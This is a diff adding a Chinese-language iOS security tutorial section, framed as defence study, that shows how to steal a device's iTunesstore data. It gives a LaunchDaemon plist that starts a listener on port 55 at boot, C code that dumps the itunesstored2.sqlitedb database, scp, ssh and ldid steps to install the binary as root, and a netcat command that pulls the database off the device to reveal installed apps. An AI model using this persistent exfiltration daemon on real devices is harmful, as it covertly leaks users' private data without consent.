@@ -163,3 +163,106 @@ Hello world !!!
 运行成功，这就完成了最简单的手动执行自己的应用程序。
  
 ### <a name="markdown-af02"></a>iOS安全攻防（二）：后台daemon非法窃取用户iTunesstore信息
+
+
+> 本人郑重声明：并不鼓励窃取用户隐私等行为，一切hack学习都只是为了研究如何防御。OK，进入正题。
+ 
+#### 开机自启动
+ 
+在iOS安全攻防（一）：Hack必备的命令与工具中，介绍了如何编译自己的C程序并手动启动。今天介绍如何使程序变为开机自启动。
+ 
+1.首先打开Xcode创建一个plist属性文件，如下图所示：
+ 
+其中要注意一下通信服务名，我定为55。用编辑器打开，即为：
+
+    <?xml version="1.0" encoding="UTF-8"?>   
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">   
+    <plist version="1.0">   
+    <dict>   
+        <key>Program</key>   
+        <string>/usr/bin/ncdemo</string>   
+        <key>StandardErrorPath</key>   
+        <string>/dev/null</string>   
+        <key>SessionCreate</key>   
+        <true/>   
+        <key>ProgramArguments</key>   
+        <array>   
+            <string>/usr/bin/ncdemo</string>   
+        </array>   
+        <key>inetdCompatibility</key>   
+        <dict>   
+            <key>Wait</key>   
+            <false/>   
+        </dict>   
+        <key>Sockets</key>   
+        <dict>   
+            <key>Listeners</key>   
+            <dict>   
+                <key>SockServiceName</key>   
+                <string>55</string>   
+            </dict>   
+        </dict>   
+    </dict>   
+    </plist>   
+
+ 
+最后，将plist文件 scp 至 root@192.168.1.114:/System/Library/LaunchDaemons/ 下 .
+
+编写读取iTunesstore数据库程序
+读取itunesstored2.sqlitedb信息，并输出到stdout中，便于我们读取。
+
+    #include <stdio.h>   
+    #include <fcntl.h>   
+    #include <stdlib.h>   
+       
+    #define FILE "/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb"   
+       
+    int main(){   
+        int fd = open(FILE, O_RDONLY);   
+        char buf[128];   
+        int ret = 0;   
+           
+        if(fd < 0)   
+            return -1;   
+        while (( ret = read(fd, buf, sizeof(buf))) > 0){   
+            write( fileno(stdout), buf, ret);   
+        }   
+        close(fd);   
+        return 0;   
+    }   
+
+ 编译、拷贝、签名
+1.编译方法上篇文章已经介绍清楚，这里不再重复，直接￥%￥＃%￥……%＃ 生成运行在ARM的 ncdemo 
+ 
+2.将ncdemo scp 到设备中，并登录
+
+```
+$ scp ncdemo root@192.168.1.114:ncdemo
+$ ssh root@192.168.1.114
+```
+ 
+3.签名
+
+```
+#ldid -S ncdemo
+#mv ncdemo /usr/bin
+```
+
+抓取 iTunesstore 数据信息
+这时，我们只需要利用netcat，指定之前定义的服务名称，轻松在本地抓取设备 iTunesstore 信息.
+
+```
+$ nc 192.168.1.114 55 > itunesstored2.sqlitedb
+```
+ 
+分析 iTunesstore 数据信息
+好吧，这里就介绍个最简单的应用，利用string命令查看：
+
+```
+$ strings itunesstored2.sqlitedb 
+```
+ 
+于是乎，我们就清晰的得到了iPhone /iPad 设备上都安装了哪些app ：
+
+
+![](./images/4196_140211110054_1.png)
